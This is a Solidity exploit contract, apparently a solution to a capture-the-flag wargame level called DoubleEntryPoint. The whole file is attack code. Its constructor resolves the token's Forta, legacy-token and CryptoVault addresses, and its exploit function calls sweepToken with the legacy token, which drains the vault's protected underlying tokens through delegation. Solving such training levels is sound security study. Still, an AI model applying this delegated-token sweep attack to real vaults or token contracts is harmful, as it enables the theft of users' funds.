// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import "exploit_templates/Destructible.sol";
import "exploit_templates/Targeted.sol";

import "doubleentrypoint/contract.sol";

contract Exploit is Destructible, Targeted {
    DoubleEntryPoint dep_token;
    Forta forta;
    LegacyToken legacy_token;
    CryptoVault crypto_vault;
    constructor(address target_addr) payable Targeted(target_addr) {
        dep_token = DoubleEntryPoint(target_addr);
        forta = dep_token.forta();
        legacy_token = LegacyToken(dep_token.delegatedFrom());
        crypto_vault = CryptoVault(dep_token.cryptoVault());
    }
    function exploit() public payable {
        crypto_vault.sweepToken(legacy_token);
    }
}